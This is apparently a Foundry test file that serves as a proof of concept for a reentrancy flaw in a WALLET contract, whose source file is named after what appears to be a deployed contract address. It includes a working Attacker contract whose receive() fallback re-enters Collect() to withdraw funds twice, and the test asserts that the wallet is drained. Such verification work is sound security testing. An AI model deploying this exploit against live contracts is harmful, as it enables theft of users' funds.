// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol";

contract WALLET_ReentrancyTest is Test {
    MockLogger public mockLogger;
    WALLET public wallet;
    Attacker public attacker;
    
    function setUp() public {
        mockLogger = new MockLogger();
        wallet = new WALLET(address(mockLogger));
        attacker = new Attacker(address(wallet));
        
        // Fund attacker contract with 1 ether
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits using its own balance
        attacker.deposit(0);
        
        // Advance time to satisfy unlock condition
        vm.warp(block.timestamp + 1);
        
        // Verify initial balance
        assertEq(address(wallet).balance, 1 ether, "Initial wallet balance incorrect");
        
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console2.log("Wallet balance: %s", walletBalanceBefore);
        console2.log("Attacker balance: %s", attackerBalanceBefore);
        
        console2.log("--- Trigger Attack (attacker.attack) ---");
        // Execute attack - withdraw 0.5 ether twice
        attacker.attack(0.5 ether);
        
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("Wallet balance: %s", walletBalanceAfter);
        console2.log("Attacker balance: %s", attackerBalanceAfter);

        // Verify attacker drained funds
        assertEq(address(attacker).balance, 1 ether, "Attacker should have 1 ether");
        assertEq(address(wallet).balance, 0 ether, "Wallet should be drained");

        // Differential verification
        if (attackerBalanceAfter - attackerBalanceBefore == 1 ether && 
            walletBalanceBefore - walletBalanceAfter == 1 ether) {
            console2.log("Vulnerability Exists: Attack drained wallet funds");
        } else {
            console2.log("Vulnerability not Exist: Wallet funds not drained");
        }
    }
}

contract Attacker {
    WALLET public immutable wallet;
    uint private count;
    uint private amount;

    constructor(address _wallet) {
        wallet = WALLET(payable(_wallet));
    }

    // Modified to use contract's balance instead of msg.value
    function deposit(uint unlockTime) public {
        wallet.Put{value: address(this).balance}(unlockTime);
    }

    function attack(uint _am) public {
        amount = _am;
        count = 0;
        wallet.Collect(amount);
    }

    receive() external payable {
        if (count < 1) {
            count++;
            wallet.Collect(amount);
        }
    }
}

contract MockLogger {
    function AddMessage(address, uint, string memory) public {
        // Empty implementation for testing
    }
}